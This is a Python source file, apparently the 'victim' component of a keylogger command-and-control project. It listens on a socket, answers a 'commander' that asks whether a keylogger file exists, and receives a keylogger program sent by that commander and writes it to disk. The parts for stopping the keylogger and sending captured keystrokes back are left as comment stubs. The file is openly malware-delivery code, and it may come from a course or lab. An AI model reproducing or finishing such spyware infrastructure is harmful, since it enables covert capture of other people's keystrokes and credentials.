import os
import socket
import constants
from victim_utils import *

if __name__ == '__main__':
    # Print banner
    print(constants.OPENING_BANNER)

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Define the server address and port
    server_address = ('localhost', 8888)

    # Bind the socket to the server address and port
    server_socket.bind(server_address)

    # Listen for incoming connections (maximum 5 clients in the queue)
    server_socket.listen(5)
    print("[+] Server is listening on IP {} on port {}".format(*server_address))

    while True:
        print("[+] Waiting for a connection...")
        client_socket, client_address = server_socket.accept()
        print("[+] Accepted connection from {}:{}".format(*client_address))
        print(constants.MENU_CLOSING_BANNER)

        try:
            while True:
                # Receive data from the client
                data = client_socket.recv(1024)
                if not data:
                    print("[+] Client {}:{} disconnected.".format(client_address[0], client_address[1]))
                    break

                # CHECK: Command to start keylogger program
                if data.decode() == constants.START_KEYLOG_MSG:
                    print(constants.START_KEYLOGGER_PROMPT)
                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())

                    # Receive command and filename from commander
                    command = client_socket.recv(1024).decode()
                    file_name = client_socket.recv(1024).decode()
                    print(constants.RECEIVE_FILE_NAME_PROMPT.format(file_name))

                    if command == constants.CHECK_KEYLOG:
                        print(constants.DO_CHECK_MSG.format(file_name))

                        # Get the current working directory
                        current_directory = os.getcwd()

                        # Create the full path to the file by joining the directory and file name
                        file_path = os.path.join(current_directory, file_name)

                        # Check if the file exists, then start keylogger
                        if os.path.exists(file_path):
                            print(constants.FILE_FOUND_MSG.format(file_name))
                            status = client_socket.send(constants.STATUS_TRUE.encode())
                            msg = client_socket.send(constants.FILE_FOUND_MSG_TO_COMMANDER.format(file_name).encode())


                        else:
                            print(constants.FILE_NOT_FOUND_ERROR.format(file_name))
                            status = client_socket.send(constants.STATUS_FALSE.encode())
                            msg = client_socket.send(constants.FILE_NOT_FOUND_TO_CMDR_ERROR.format(file_name).encode())

                # CHECK: Command to stop keylogger program

                # CHECK: Command to get keylog program from commander
                if data.decode() == constants.TRANSFER_KEYLOG_MSG:
                    # Send an initial acknowledgement to the client (giving them green light for transfer)
                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())

                    # Call to receive the file data and checksum from the client
                    filename = client_socket.recv(1024).decode()
                    print(constants.RECEIVING_FILE_MSG.format(filename))

                    with open(filename, "wb") as file:
                        while True:
                            data = client_socket.recv(1024)
                            if not data:
                                break
                            if data.endswith(constants.END_OF_FILE_SIGNAL):  # EOF signal (prevent recv() blocking)
                                data = data[:-len(constants.END_OF_FILE_SIGNAL)]
                                file.write(data)
                                break
                            file.write(data)

                    # Send ACK to commander (if good)
                    if is_file_openable(filename):
                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
                        client_socket.send(constants.VICTIM_ACK.encode())
                    else:
                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())

                # Check if data is to send recorded keystroked file to commander

                # Check if data is to terminate connection

                # Send the same data back to the client
                # client_socket.send(data)
                print("[+] Sent data back to the client.")

        except ConnectionResetError:
            print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
        except KeyboardInterrupt:
            print("[+] Victim is shutting down...")
            break
        except Exception as e:
            print("[+] An error occurred: {}".format(e))
